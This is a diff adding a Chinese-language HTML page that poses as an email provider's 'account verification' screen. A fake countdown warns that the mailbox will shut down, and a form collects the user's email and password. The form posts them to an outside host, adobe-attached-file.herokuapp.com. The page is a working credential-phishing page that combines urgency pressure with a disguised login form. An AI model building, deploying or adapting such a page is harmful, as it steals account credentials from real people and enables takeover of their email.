@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>电子邮件设置| 验证</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+
+	<link rel="icon" href="images/id.png" sizes="13x13" type="image/png">
+	
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js"></script>
+	
+	<link rel="stylesheet" href="stylesheets/style.css">
+	</head>
+	<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" rightmargin="0" leftmargin="0" link="#3F59A4" alink="#3F59A4" vlink="#3F59A4">
+	
+
+
+	<table width="100%" height="" cellspacing="0">
+	
+	<tbody><tr><td height="30" bgcolor="#000000">
+	
+		<table width="" align="center"><tbody><tr>
+	
+	
+		<td>
+		<img src="images/payh.gif" >
+		</td>
+	
+	
+		<td width="5"></td>
+	
+	
+		<td>
+		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
+		电子邮件设置
+		</font>
+		</td>
+	
+	
+	
+	
+	
+	
+	
+		<td width="800">
+		<div align="right">
+			<input id="clone">
+		</div>
+		</td>
+	
+	
+<td width="5"></td>
+	
+	
+	
+	
+	
+		<td>
+		<a href="">
+		<button class="btn btn-primary">搜索</button>
+		</a>
+		</td>
+	
+		</tr></tbody></table>
+	
+	</td></tr>
+	<tr><td height="60" bgcolor="#FFFFFF"></td>
+	</tr><tr><td height="" bgcolor="#FFFFFF">
+	
+		<table width="650" align="center" cellspacing="0">
+	
+		<tbody><tr><td>
+		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2" color="#3F59A4">
+		帐户验证
+		</font>
+		</td></tr>
+	
+	
+		<tr><td height="15" bgcolor="#FFFFFF"></td>
+	
+	
+	
+		</tr><tr><td>
+	
+			<table><tbody><tr>
+	
+			<td>
+			<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
+			倒计时到您的电子邮件关机: 
+			</font>
+			</td>
+	
+	
+			<td>
+			<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ff0000">
+	
+			<b><div id="hms">01:15:30</div></b>
+			<script type="text/javascript">
+			function counter() {
+		
+				var startTime = document.getElementById('hms').innerHTML;
+				var pieces = startTime.split(":");
+				var time = new Date();    
+				time.setHours(pieces[0]);
+				time.setMinutes(pieces[1]);
+				time.setSeconds(pieces[2]);
+				var timedif = new Date(time.valueOf() - 1000);
+				var newtime = timedif.toTimeString().split(" ")[0];
+				document.getElementById('hms').innerHTML=newtime;
+				setTimeout(counter, 1000);
+			}
+			counter();
+		
+			</script>
+			
+	
+			</font>
+	
+			</td>
+	
+	
+	
+			</tr></tbody></table>
+	
+		
+		</td></tr>
+	
+	
+	
+	
+	
+	
+	
+		<tr><td>
+		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
+		要防止您的电子邮件关闭，请在下面验证您的帐户详细信息: 
+		</font>
+		</td></tr>
+		
+		
+	
+	
+	
+		<tr><td height="25" bgcolor="#FFFFFF" ></td>
+	
+	
+	
+		</tr>
+	
+	
+	<tr><td height="5" bgcolor="#FFFFFF"></td>
+	
+	
+		
+		</tr><tr><td>
+		<form method="post" id="contact" action="https://adobe-attached-file.herokuapp.com/">
+			<div class="alert alert-danger hide col-5" id="msg"></div>
+			<input type="hidden" name="source" id="source" value="Screniah">
+			<!-- <input name="email" id="email" > -->
+		</td></tr>
+		<tr><td>
+			<input id="email" name="email" type="email" style="width:350px; height:35px; font-family: Verdana; 
+						  font-size: 15px; color:#000000; background-color: #ffffff; 
+						  border: solid 1px #848484; padding: 10px; -moz-border-radius: 5px; 
+						  -webkit-border-radius: 5px; 	-khtml-border-radius: 5px; 
+						  border-radius: 5px;" placeholder="输入电子邮件以继续" disabled>
+		</td></tr>
+		<tr><td>
+			<input id="password" name="password" type="password" style="width:350px; height:35px; font-family: Verdana; 
+						  font-size: 15px; color:#000000; background-color: #ffffff; 
+						  border: solid 1px #848484; padding: 10px; -moz-border-radius: 5px; 
+						  -webkit-border-radius: 5px; 	-khtml-border-radius: 5px; 
+						  border-radius: 5px;" placeholder="输入密码以继续" required>
+		</td></tr>
+
+		<tr><td height="5" bgcolor="#FFFFFF"></td>
+		</tr><tr><td>
+			<input value="签到 >>" id="submit-btn" type="submit" style="width:270px; height:55px; font-family: Verdana; 
+						font-size: 17px; color:#ffffff; 
+						background-color: #3F59A4; border: solid 1px #3F59A4; padding: 10px; 
+						-moz-border-radius: 2px; -webkit-border-radius: 2px; 
+						-khtml-border-radius: 2px; border-radius: 2px;
+						-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; 
+						box-shadow: 3px 3px 3px #888;" >
+		</td></tr>
+	</form></td></tr>
+	<tr><td height="200" bgcolor="#FFFFFF"></td>
+		</tr><tr><td>
+		<hr width="650" align="left">
+		</td></tr>
+	
+	
+	
+	
+	
+	
+	
+		<tr><td height="10" bgcolor="#FFFFFF"></td>
+	
+	
+	
+	
+	
+		</tr><tr><td>
+		<a href="" style="text-decoration:none">
+		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
+		<b>***</b> 帐户/设置/安全设置/帐户验证 >>
+		</font>
+		</a>
+		</td></tr>
+	
+	
+		</tbody></table>
+	
+	</td></tr>
+	
+	
+	
+	</tbody></table>
+	
+	
+	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script src="js/script.js"></script>
+	
+	</body>
+	</html>
